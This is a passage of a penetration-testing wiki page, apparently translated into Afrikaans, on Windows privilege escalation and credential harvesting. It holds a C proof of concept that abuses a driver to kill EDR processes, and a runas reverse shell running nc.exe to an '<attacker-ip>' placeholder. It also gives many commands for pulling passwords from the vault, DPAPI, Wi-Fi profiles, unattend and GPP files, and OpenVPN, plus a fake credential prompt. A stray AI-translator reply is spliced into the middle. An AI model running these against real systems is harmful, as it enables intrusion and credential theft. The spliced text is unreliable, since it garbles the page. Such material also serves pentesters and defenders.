#### Registry hive memory corruption primitives

Moderne hive vulnerabilities laat jou deterministiese indelings voorsien, misbruik skryfbare HKLM/HKU nakomelinge, en omskep metadata-korrupsie in kernel paged-pool overflows sonder 'n custom driver. Leer die volledige ketting hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Misbruik van ontbrekende FILE_DEVICE_SECURE_OPEN op device objects (LPE + EDR kill)

Sommige ondertekende derdeparty drivers skep hul device object met 'n sterk SDDL via IoCreateDeviceSecure maar vergeet om FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics te stel. Sonder hierdie vlag word die secure DACL nie afgedwing wanneer die device deur 'n pad met 'n ekstra komponent oopgemaak word nie, wat enige onbevoorregte gebruiker toelaat om 'n handle te bekom deur 'n namespace path soos:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Sodra 'n gebruiker die device kan open, kan bevoorregte IOCTLs wat deur die driver geopenbaar word misbruik word vir LPE en manipulasie. Voorbeelde van vermoëns waargeneem in die natuur:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Onbeperkte raw disk read/write (offline tampering, boot-time persistence tricks).
- Beëindig arbitêre prosesse, insluitende Protected Process/Light (PP/PPL), wat AV/EDR kill vanuit user land via kernel toelaat.

Minimale PoC-patroon (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigeringe vir ontwikkelaars
- Stel altyd FILE_DEVICE_SECURE_OPEN in wanneer jy device objects skep wat deur 'n DACL beperk moet word.
- Valideer die caller-konteks vir privileged operations. Voeg PP/PPL kontroles by voordat jy process termination of handle returns toelaat.
- Beperk IOCTLs (access masks, METHOD_*, input validation) en oorweeg brokered models in plaas van direkte kernel privileges.

Opsporingsidees vir verdedigers
- Bewaak user-mode opens van verdagte device names (e.g., \\ .\\amsdk*) en spesifieke IOCTL sequences wat op misbruik dui.
- Dwing Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) af en onderhoud jou eie allow/deny lists.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Kontroleer toestemmings van alle gidse binne PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vir meer inligting oor hoe om hierdie kontrole te misbruik:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Netwerk

### Gedeelde gidse
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Kontroleer vir ander bekende rekenaars wat hardcoded in die hosts file is
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netwerk-koppelvlakke & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Oop Poorte

Kontroleer vir **beperkte dienste** van buite
```bash
netstat -ano #Opened ports?
```
### Roete-tabel
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tabel
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-reëls

[**Kyk na hierdie bladsy vir Firewall-verwante opdragte**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, afskakel, afskakel...)**

Meer[ opdragte vir network enumeration hier](../basic-cmd-for-pentesters.md#network)

### Windows Substelsel vir Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die binêre `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy die root user kry, kan jy op enige poort luister (die eerste keer as jy `nc.exe` gebruik om op 'n poort te luister, sal dit via GUI vra of `nc` deur die firewall toegelaat moet word).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Om maklik bash as root te begin, kan jy `--default-user root` probeer

Jy kan die `WSL` lêerstelsel in die gids `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` verken

## Windows Aanmeldbewyse

### Winlogon Aanmeldbewyse
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Die Windows Vault stoor gebruikers se credentials vir servers, websites en ander programme waarmee **Windows** gebruikers outomaties kan aanmeld. Op die oog af lyk dit asof gebruikers nou hul Facebook-credentials, Twitter-credentials, Gmail-credentials, ens. kan stoor sodat hulle outomaties via browsers aangemeld word. Maar dit is nie so nie.

Windows Vault stoor credentials wat Windows in staat stel om gebruikers outomaties aan te meld, wat beteken dat enige **Windows-toepassing wat credentials benodig om toegang tot 'n hulpbron te kry** (server of 'n webwerf) **can make use of this Credential Manager** & Windows Vault en die verskafde credentials kan gebruik in plaas daarvan dat gebruikers elke keer die gebruikersnaam en wagwoord moet invoer.

Behalwe as die toepassings met die Credential Manager interaksie het, dink ek nie dit is moontlik vir hulle om die credentials vir 'n gegewe hulpbron te gebruik nie. Dus, as jou toepassing die vault wil gebruik, moet dit op een of ander manier **kommunikeer met die credential manager en die credentials vir daardie hulpbron versoek** vanaf die standaard stoorvault.

Gebruik die `cmdkey` om die gestoorde credentials op die masjien te lys.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dan kan jy `runas` met die `/savecred`-opsies gebruik om die gestoorde credentials te benut. Die volgende voorbeeld roep 'n remote binary via 'n SMB share aan.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Gebruik van `runas` met 'n verskafde stel credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Neem kennis van mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), of die [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** bied 'n metode vir simmetriese enkripsie van data, hoofsaaklik gebruik binne die Windows-bedryfstelsel vir die simmetriese enkripsie van asymmetriese private sleutels. Hierdie enkripsie maak gebruik van 'n gebruiker- of stelselgeheim wat beduidend bydra tot entropie.

**DPAPI maak die enkripsie van sleutels moontlik deur 'n simmetriese sleutel wat afgelei word van die gebruiker se aanmeldgeheime**. In scenario's wat stelsel-enkripsie betrek, gebruik dit die stelsel se domeinauthentiseringsgeheime.

Gekodeerde gebruiker RSA-sleutels, wat DPAPI gebruik, word gestoor in die `%APPDATA%\Microsoft\Protect\{SID}` gids, waar `{SID}` die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) verteenwoordig. **Die DPAPI-sleutel, saam met die master-sleutel wat die gebruiker se private sleutels in dieselfde lêer beskerm**, bestaan tipies uit 64 bytes ewekansige data. (Dit is belangrik om te let dat toegang tot hierdie gids beperk is, wat verhoed dat die inhoud met die `dir`-opdrag in CMD gelys word, alhoewel dit deur PowerShell gelys kan word).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Jy kan die **mimikatz module** `dpapi::masterkey` met die toepaslike argumente (`/pvk` of `/rpc`) gebruik om dit te ontsleutel.

Die **credentials files protected by the master password** is gewoonlik geleë in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Jy kan die **mimikatz module** `dpapi::cred` met die toepaslike `/masterkey` gebruik om te ontkripteer.\\
Jy kan **onttrek baie DPAPI** **masterkeys** uit **die geheue** met die `sekurlsa::dpapi` module (as jy root is).

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-inlogbewyse

**PowerShell inlogbewyse** word dikwels gebruik vir **scripting** en automatiseringstake as 'n manier om geënkripteerde inlogbewyse gerieflik te stoor. Die inlogbewyse word beskerm met **DPAPI**, wat gewoonlik beteken dat hulle slegs deur dieselfde gebruiker op dieselfde rekenaar waarop hulle geskep is ontkripteer kan word.

Om 'n PS-inlogbewys uit die lêer wat dit bevat te **ontkripteer**, kan jy:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Draadloos
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gestoorde RDP-verbindinge

Jy kan hulle vind by `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Onlangs Uitgevoerde Opdragte
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Afstandslessenaar Kredensiaalbestuurder**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **ontsleutel enige .rdg-lêers**\
Jy kan **onttrek baie DPAPI masterkeys** uit die geheue met die Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Mense gebruik dikwels die StickyNotes app op Windows-werkstasies om **save passwords** en ander inligting te bewaar, sonder om te besef dat dit 'n databasislêer is. Hierdie lêer is geleë by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en dit is altyd die moeite werd om daarna te soek en dit te ondersoek.

### AppCmd.exe

**Let wel dat om passwords vanaf AppCmd.exe te recover moet jy Administrator wees en dit onder 'n High Integrity vlak laat loop.**\
**AppCmd.exe** is geleë in die `%systemroot%\system32\inetsrv\` directory.\
As hierdie lêer bestaan, is dit moontlik dat sekere **credentials** gekonfigureer is en **recovered** kan word.

Hierdie kode is onttrek uit [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Kontroleer of `C:\Windows\CCM\SCClient.exe` exists .\
Installers word **met SYSTEM privileges uitgevoer**, baie is kwesbaar vir **DLL Sideloading (Inligting van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Lêers en Register (Inlogbewyse)

### Putty Inlogbewyse
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH gasheer-sleutels
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-sleutels in registry

SSH private keys kan in die registry key `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, dus moet jy kyk of daar iets interessant daarin is:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
As jy enige inskrywing in daardie pad vind, is dit waarskynlik 'n gestoor SSH-sleutel. Dit word versleuteld gestoor, maar kan maklik gedekripteer word met behulp van [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

As die `ssh-agent` diens nie loop nie en jy wil hê dit moet outomaties by opstart begin, voer:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Dit lyk asof hierdie tegniek nie meer geldig is nie. Ek het probeer om 'n paar ssh-sleutels te skep, dit met `ssh-add` by te voeg en via ssh by 'n masjien aan te meld. Die register HKCU\Software\OpenSSH\Agent\Keys bestaan nie en procmon het nie die gebruik van `dpapi.dll` tydens die asymmetriese sleutel-outentisering geïdentifiseer nie.

### Onbewaakte lêers
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Jy kan ook vir hierdie lêers soek deur gebruik te maak van **metasploit**: _post/windows/gather/enum_unattend_

Voorbeeldinhoud:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM rugsteun
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Wolk-inlogbewyse
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Soek na 'n lêer met die naam **SiteList.xml**

### Gekasde GPP Wagwoord

Daar was voorheen 'n funksie wat die implementering van aangepaste plaaslike administratorrekeninge op 'n groep masjiene via Group Policy Preferences (GPP) toegelaat het. Hierdie metode het egter groot sekuriteitsgebreke gehad. Eerstens kon die Group Policy Objects (GPOs), wat as XML-lêers in SYSVOL gestoor word, deur enige domeingebruiker gekry word. Tweedens kon die wagwoorde binne hierdie GPPs, wat met AES256 versleuteld is en 'n publiek gedokumenteerde standaard sleutel gebruik, deur enige geauthentiseerde gebruiker ontsleutel word. Dit het 'n ernstige risiko ingehou, aangesien dit gebruikers verhoogde regte kon gee.

Om hierdie risiko te verminder is 'n funksie ontwikkel wat plaaslik gekasde GPP-lêers met 'n nie-leë "cpassword" veld ondersoek. Wanneer so 'n lêer gevind word, ontsleutel die funksie die wagwoord en gee 'n pasgemaakte PowerShell-objek terug. Hierdie objek sluit besonderhede oor die GPP en die lêer se ligging in, wat help om hierdie sekuriteitskwessie te identifiseer en reg te stel.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Om die cPassword te ontsleutel:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Gebruik crackmapexec om die wagwoorde te kry:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web-konfigurasie
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Voorbeeld van web.config met inlogbesonderhede:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-aanmeldbewyse
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Vra vir credentials

Jy kan altyd **die user vra om sy credentials in te voer of selfs die credentials van 'n ander user** as jy dink hy dit kan weet (let wel dat dit regtig **riskant** is om die client direk vir die **credentials** te **vra**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moontlike lêernamen wat credentials bevat**

Bekende lêers wat 'n geruime tyd gelede **passwords** in **clear-text** of **Base64** bevat het
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your repository or files. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the list of proposed files and their contents). I will then translate the relevant English text to Afrikaans following your rules and keep all markdown/html/tags/links/paths unchanged.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in die RecycleBin

Jy moet ook die Bin nagaan om vir credentials daarin te kyk

Om **wagwoorde te herstel** wat deur verskeie programme gestoor is, kan jy gebruik: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Binne die register

**Ander moontlike registersleutels met credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Blaaiergeskiedenis

Jy moet kyk vir dbs waar wagwoorde van **Chrome or Firefox** gestoor word.\
Kontroleer ook die geskiedenis, boekmerke en gunstelinge van die blaaiers — dalk is sommige **passwords are** daar gestoor.

Gereedskap om wagwoorde uit blaaiers te onttrek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** is 'n tegnologie ingebou in die Windows-operating system wat interkommunikasie tussen sagtewarekomponente in verskillende tale toelaat. Elke COM-komponent word **identified via a class ID (CLSID)** en elke komponent bied funksionaliteit deur een of meer interfaces, geïdentifiseer via interface IDs (IIDs).

COM classes and interfaces word in die register gedefinieer onder **HKEY\CLASSES\ROOT\CLSID** en **HKEY\CLASSES\ROOT\Interface** onderskeidelik. Hierdie register word geskep deur die samevoeging van **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Basies, as jy enige van die **DLLs** wat uitgevoer gaan word kan overwrite, kan jy **escalate privileges** as daardie DLL deur 'n ander gebruiker uitgevoer gaan word.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generiese wagwoordsoektog in lêers en register**

**Soek in lêerinhalte**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Soek na 'n lêer met 'n sekere lêernaam**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Soek in die register na sleutelname en wagwoorde**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Gereedskap wat na wagwoorde soek

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is 'n msf** plugin wat ek geskep het om **outomaties elke metasploit POST module wat na credentials soek** binne die slagoffer uit te voer.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties al die lêers wat die in hierdie bladsy genoemde wagwoorde bevat.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is nog 'n uitstekende hulpmiddel om wagwoorde uit 'n stelsel te onttrek.

Die hulpmiddel [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessies**, **gebruikersname** en **wagwoorde** van verskeie tools wat hierdie data in platte teks stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY, en RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

